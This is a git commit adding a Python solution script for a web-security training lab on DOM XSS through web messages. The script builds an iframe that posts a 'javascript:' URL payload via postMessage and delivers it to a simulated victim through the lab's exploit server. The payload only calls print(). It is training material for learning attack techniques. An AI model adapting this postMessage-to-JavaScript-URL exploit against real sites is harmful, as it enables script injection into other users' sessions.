a02c492170399d30fa98d64b9f91c730a779681d
Ahmed Elqalaawy <elqal3awii@gmail.com>
2023-12-13 07:07:58 +0200

    Added 'DOM XSS using web messages and a JavaScript URL' lab

---
+++ DOM-based vulnerabilities/DOM XSS using web messages and a JavaScript URL/main.py
@@ -0,0 +1,41 @@
+####################################################################
+#
+# Lab: DOM XSS using web messages and a JavaScript URL
+#
+# Hack Steps:
+#      1. Craft an iframe that, upon loading, will send an XSS
+#         payload using the postMessage API
+#      2. Deliver the exploit to the victim
+#
+####################################################################
+import requests
+from colorama import Fore
+
+# Change this to your lab URL
+LAB_URL = "https://0a63007604442bc787ed0f4900d900b1.web-security-academy.net"
+
+# Change this to your exploit server URL
+EXPLOIT_SERVER_URL = "https://exploit-0a88006f04252b9087ba0e0001600091.exploit-server.net"
+
+def main():
+    response_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
+    xss_payload = "javascript:print();//http:"
+    payload = f"""<iframe src="{LAB_URL}" onload="this.contentWindow.postMessage('{xss_payload}','*')">"""
+    data = { "responseBody": payload, "responseHead": response_head, "formAction": "DELIVER_TO_VICTIM", "urlIsHttps": "on", "responseFile": "/exploit" }
+
+    print("❯❯ Delivering the exploit to the victim.. ", end="", flush=True)
+    
+    try:
+        requests.post(EXPLOIT_SERVER_URL, data)
+
+    except:
+        print(Fore.RED + "⦗!⦘ Failed to deliver the exploit to the victim through exception")
+        exit(1)
+
+    print(Fore.GREEN + "OK")
+    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")
+
+if __name__ == "__main__":
+    main()
+
+
